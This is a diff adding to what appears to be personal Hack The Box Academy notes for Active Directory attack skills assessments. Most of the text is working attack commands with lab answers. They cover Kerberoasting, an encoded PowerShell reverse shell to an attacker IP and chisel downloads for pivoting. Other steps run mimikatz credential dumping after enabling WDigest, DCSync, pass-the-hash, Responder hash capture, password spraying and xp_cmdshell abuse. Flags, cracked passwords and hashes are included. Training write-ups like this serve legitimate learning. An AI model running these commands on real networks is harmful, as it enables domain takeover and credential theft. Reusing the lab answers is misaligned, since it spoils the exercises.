@@ -4096,12 +4096,30 @@ Results:  svc_sql
 
 **Crack the account's password. Submit the cleartext value.**
 
-```
-# Obtain the ticket
+```powershell
+# Way 1:
+# a)get information about domain
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+
+# b) Obtain the ticket
 cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
 
-# Copy ticket to the file sqlservice in my attacker machine and crack it:
+# c) Copy ticket to the file sqlservice in my attacker machine and crack it:
 hashcat -m 13100 sqlserver /usr/share/wordlists/rockyou.txt
+
+
+# Way 2:
+# a) get information about the system machine and the domain name
+systeminfo
+# b) get information about domain
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+# c) Authenticate using Kerberos with the user MSSQLSvc/SQL01.inlanefreight.local:1433.
+Add-Type –AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/SQL01.inlanefreight.local:1433’
+# d) Extract the generated ticket using Rubeus
+.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
+Get-Content hashes.txt
+# e) Crack it offline from your attacking machine
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 ```
 
 Results: lucky7
@@ -4109,12 +4127,39 @@ Results: lucky7
 
 **Submit the contents of the flag.txt file on the Administrator desktop on MS01**
 
-```
-# We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers
+```powershell
+# Way 1:
+# a) We upload the file Microsoft.ActiveDirectory.Management.dll from the Active Directory powershell module and now we can use it to enumerate computers
 Import-Module .\Microsoft.ActiveDirectory.Management.dll; Get-ADComputer -Filter * | Select-Object Name 
-
-# We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01
+# b) We need to concatenate commands with semi-colon. The following commands create a Secure-string object with the credential of the user svc_sql. Then we will use Invoke-Command to run a command in the remote host MS01
 $password = ConvertTo-SecureString "lucky7" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\svc_sql", $password; Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
+
+
+# Way 2:
+# a) Upload chisel.exe:
+# In your kali machine
+python3 -m http.server 8080
+# From the anktak webapp
+Invoke-WebRequest http://10.10.15.140:8080/chisel.exe -OutFile chisel.exe
+# b) See if we have connection to the machine MS01 and what IP is using
+ping MS01
+# We obtain IP   172.16.6.50 
+# c) We connect with nc. In a terminal of our attacking machine:
+nc -lnvp 1234
+# d) In the antak terminal
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+# e) Now we have a connection in our kali. We will open a Chisel tunnel. For that, launch the chisel server in your kali attacking machine:
+./chisel.exe server -p 8001 --reverse
+# f) Now in the pivot terminal that you obtained launch the .chisel.exe binary (you need to upload it before)
+.\chisel.exe client 10.10.15.140:8001 R:socks
+# g) The connection in the kali will give you the port in which the chisel server is listening, in my case 1080. Modify your proxychains file (/etc/proxychains4.conf) last line to 
+socks5 127.0.0.1 1080.
+# h) Now we can verify that the user svc_sql has access to the machine MS01 using proxychains
+proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7
+# i) After confirmation, now we can a
+proxychains path/to/impacket/examples/psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50
+# j) and get the flag:
+type "C:\Users\Administrator\Desktop\flag.txt" 
 ```
 
 Results: spn$_r0ast1ng_on_@n_0p3n_f1re
@@ -4123,57 +4168,344 @@ Results: spn$_r0ast1ng_on_@n_0p3n_f1re
 **Find cleartext credentials for another domain user. Submit the username as your answer.**
 
 ```
-# Enumerate SPNs with
-setspn.exe -Q */*
+# Upload chisel.exe:
+# In your kali machine
+python3 -m http.server 8080
+# From the anktak webapp
+Invoke-WebRequest http://10.10.15.140:8080/chisel.exe -OutFile chisel.exe
 
-# backupjob looks like a promising user. FRom the previous output we also know:
-# backupjob/veam001.inlanefreight.local
-Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN backupjob/veam001.inlanefreight.local -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+# See if we have connection to the machine MS01 and what IP is using
+ping MS01
+# We obtain IP   172.16.6.50 
 
-sqldev
-MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
-Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+# We connect with nc. In a terminal of our attacking machine:
+nc -lnvp 1234
 
-sqlprod
-MSSQLSvc/SQL02.inlanefreight.local:1433
-Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL02.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+# In the antak terminal
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADAAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 
-Import-Module .\PowerView.ps1 ; Get-DomainSPNTicket -SPN krbtgt/DC01.INLANEFREIGHT.LOCAL -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
-	
+# Now we have a connection in our kali. We will open a Chisel tunnel. For that, launch the chisel server in your kali attacking machine:
+chisel server -p 8000 --reverse
+
+# Now in the pivot terminal that you obtained launch the .chisel.exe binary (you need to upload it before)
+.\chisel.exe client 10.10.15.140:8000 R:socks
+
+# The connection in the kali will give you the port in which the chisel server is listening, in my case 1080. Modify your proxychains file (/etc/proxychains4.conf) last line to 
+socks5 127.0.0.1 1080.
+
+# Now we can enter to the MS01 machine using proxychains and the svc_sql user
+proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /cert:ignore 
 ```
 
-Results:
 
+Now we need to enable WDigest. See this article about it: https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/
+
+For that, right click on Powershell and open as administrator in the target machine 172.16.6.50:
+
+```powershell
+# Open a Powershell terminal and Enable "WDigest".
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+# Confirm that it is enabled
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
+# And 'UseLogonCredential REG_DWORD 0x1' should be set to 1, not 0. 
+
+# For the WDigest Authentication to be in plain text we will still need to reboot the target machine. FRom the Powershell terminal
+shutdown /r /t 0 /f
+```
+
+![](img/wdigest.png)
+
+```powershell
+# Now we connect again to the machine using proxychains.
+proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /cert:ignore 
+
+# After gaining access we can drag our mimikatz file to the desktop. Then we will right click on mimikatz and execute as Administrator. 
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+Results: tpetty
 
 
 **Submit this user's cleartext password.**
 
 ```
+# Now we connect again to the machine using proxychains.
+proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /cert:ignore 
 
+# Right click on the mimikatz to open as administrator and run:
+privilege::debug
+sekurlsa::logonpasswords
 ```
 
-Results:
+![](img/mimi.png)
 
+Results: Sup3rS3cur3D0m@inU2eR
 
 
 **What attack can this user perform?**
 
 ```
+# We will use bloodhound to determine it. We first upload our sharphound collector. In this case, drag the collector from your machine to the target (or copy paste). Now run it: 
+.\SharpHound.exe -c ALL --zipfilename enum
 
+# Open the Internet explorer and open the pivot html server: http://172.16.6.100/uploads/antak.aspx. Now upload the generated collector file to the pivot host
+
+# Then from the kali machine we will serve the PSUpload.ps1 file to the pivot machine 172.16.6.100. 
+python3 -m http.server 9001
+
+# We will retrieve the PSUpload.ps1 file from the pivot 172.16.6.100 
+Invoke-WebRequest http://10.10.15.140:9001/PSUpload.ps1 -OutFile PSUpload.ps1
+
+# Now we can start our Uploader server from our kali machine
+python3 -m uploadserver
+
+# And now from the pivot host, we will upload the generated collector file to our kali machine
+Import-module .\PSUpload.ps1; Invoke-FileUpload -Uri http://10.10.15.140:8000/upload -File C:\windows\system32\inetsrv\20250106032426_enum.zip 
+
+# Now we can open our neo4j server in a  kali terminal
+sudo neo4j console 
+
+# And bloodhound
+bloodhound
+
+# In bloodhound we search for the node: tpetty. Then we set it as started node. In the Node Info blade, scroll down until Outbound Object Control and see in First Degree Object Control that the user has DCSync permissions over INLANEFREIGHT.LOCAL
 ```
 
-Results:
+![](img/attack.png)
 
+Results: DCSync
 
 
 **Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01**
 
 ```
+# Get the User TPetty's SID:
+Import-Module .\PowerView.ps1; Get-DomainUser -Identity TPETTY  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+# With the $sid, checkout the replication rights:
+Import-Module .\PowerView.ps1; $sid= "S-1-5-21-2270287766-1317258649-2146029398-4607"; Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+# However we already knew this from the Bloodhound analysis.
+
+# Now we open a powershell as TPETTY user in the target host 172.16.6.50 and launch mimikatz.exe
+.\mimikatz.exe
+
+# Now we can request the domain to dump the NTLM hashes as Administrators:
+lsadump::dcsync /domain:inlanefreight.local /user:Administrator
+
+# And now from our attacker machine, we can retrieve the flag launching a pass the hash attack
+proxychains crackmapexec smb 172.16.6.3 -u Administrator -H "27dedb1dab4d8545c6e1c66fba077da0" -d INLANEFREIGHT.LOCAL -x 'type c:\Users\Administrator\Desktop\flag.txt' --exec-method smbexec 
+
+```
+
+Results: r3plicat1on_m@st3r!
+
+
+### AD Enumeration & Attacks - Skills Assessment Part II
+
+**Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain.**
+
+```
+# Access the pivot machine in two terminals
+ssh $user@$ip
+
+# From one terminal set a responder server
+ip a
+responder -I ens224
+
+# from the other terminal run a recon nmap command
+nmap nmap -T4 -A 172.16.7.0/23 -oN scan.txt
+
+# In the responder we will see several users
+```
+
+Results: AB920
+
+
+**What is this user's cleartext password?**
+
+```
+# Open the responder log
+cd /usr/share/responder/logs
+ls -la
+cat cat SMB-NTLMv2-SSP-172.16.7.3.txt
+
+# Crack the hash
+hashcat -m 5600 AB920 /usr/share/wordlists/rockyou.txt
+```
+
+Results: weasal
+
+
+ **Submit the contents of the C:\flag.txt file on MS01.**
+
+```
+# Launch a reverse proxy. From you kali terminal, use a ssh reverse proxy. In my case, I had already set in /etc/proxychains4.conf the port 1080, so I will use the same
+ssh htb-student@10.129.41.78 -D 1080
+
+# In another terminal from your attacker machine:
+proxychains xfreerdp /v:172.16.7.50 /u:AB920 /cert:ignore
+# When prompted, enter the creds: weasal
+
+# Open a powershell terminal and
+cat c:\flag.txt
+```
+
+Results: aud1t_gr0up_m3mbersh1ps!
+
+
+**Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.**
+
+```
+# Connect to the machine with assh reverse proxy
+ssh htb-student@$ip -D 1080
+
+# Now we perform enumeration by accessing to the host 172.16.7.50
+proxychains xfreerdp /v:172.16.7.50 /u:AB920 /cert:ignore
+
+# At the end we enumerate the password policy from our kali attacking machine
+proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --pass-pol
+```
+
+![](img/ad.png)
+
+```
+# Enumerate users
+proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users > users.txt
+
+# Give some format to the file so we will only have the user list:
+sed -E 's/.*INLANEFREIGHT\.LOCAL\\([A-Z0-9]+).*/\1/' users.txt > final.txt
+
+# Launch a password spray from a kali terminal
+proxychains crackmapexec smb 172.16.7.3 -u final.txt -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --no-bruteforce
+
+# It will take a while.
+# Finally we will have: 
+proxychains hydra -L ~/borrar/final.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt smb://172.16.7.3
+```
+
+Results: BR086
+
+**What is this user's password?**
+
+Results: Welcome1
+
+
+**Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?**
+
+```
+# Enumerate shares in DC01.
+proxychains smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -r 
+
+# Way 1
+# After confirming this we can connect to 172.16.7.50 with xfreerdp
+proxychains xfreerdp /v:172.16.7.50 /u:BR086 /cert:ignore
+# Now we can open a explorer and enter in the address bar: 172.16.7.3. We will see the shares of DC01.INLANEFREIGHT.LOCAL
+# Now we can browse to \\172.16.7.3\Department Shares\IT\Private\Development and will see the file web.config
+
+# Way 2: from the kali terminal
+smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R "Department Shares"
+proxychains smbclient "//172.16.7.3/Department Shares" -U "inlanefreight\BR086"
+# Now we browse to \\172.16.7.3\Department Shares\IT\Private\Development\ 
+dir
+# We retrieve the web.config file 
+get web.config
+quit
+cat web.config
+```
+
+Results: D@ta_bAse_adm1n!
+user: netdb
+
+**Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.**
+
+```
+# With the user and password from last exercise, we access the mssql database
+proxychains sqsh -S 172.16.7.60 -U netdb -P 'D@ta_bAse_adm1n!' -h
+
+# To allow advanced options to be changed.   
+EXECUTE sp_configure 'show advanced options', 1
+go
+  
+# To update the currently configured value for advanced options.  
+RECONFIGURE
+go
+
+# To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+go
+
+# To update the currently configured value for this feature.  
+RECONFIGURE
+go
+```
+
+![](img/mss.png)
+
+```
+# We try to access to the flag, but we don't have permissions
+EXEC xp_cmdshell 'type c:\Users\Administrator\Desktop\flag.txt'
+go
+
+# We will execute an attack to capture the MSSQL Service Hash
+# Firts we will run responder in the parrot pivot machine 172.16.7.240
+sudo responder -I tun0
+
+# Then from the connection to the database we will try to connect to a share
+EXEC master..xp_dirtree '\\172.16.7.240\share\'
+
+# Our responder will receive the hash:
+SQL01$::INLANEFREIGHT:df85833d580bc60d:7B7DB1880015AAD66DD73BB05952C973:0101000000000000808372934F60DB01C8180BD12D5A254300000000020008003100490032004D0001001E00570049004E002D004B00460046005000360034003800530059005500580004003400570049004E002D004B0046004600500036003400380053005900550058002E003100490032004D002E004C004F00430041004C00030014003100490032004D002E004C004F00430041004C00050014003100490032004D002E004C004F00430041004C0007000800808372934F60DB01060004000200000008003000300000000000000000000000003000002432C5370743BEE2D384041FAAD5C36AED271BC29DBA9D0E55ECC1D6217E37EC0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0037002E003200340030000000000000000000
+```
+
+Results: 
+
+
+ **Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.**
+
+```
 
 ```
 
 Results:
 
+
+**Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?**
+
+```
+
+```
+
+Results:
+
+
+**Crack this user's password hash and submit the cleartext password as your answer.**
+
+```
+
+```
+
+Results:
+
+
+
+**Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.**
+
+```
+
+```
+
+Results:
+
+
+**Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.**
+
+```
+
+```
+
+Results:
 
 
 Question
@@ -4183,6 +4515,7 @@ Question
 ```
 
 Results:
+
 
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
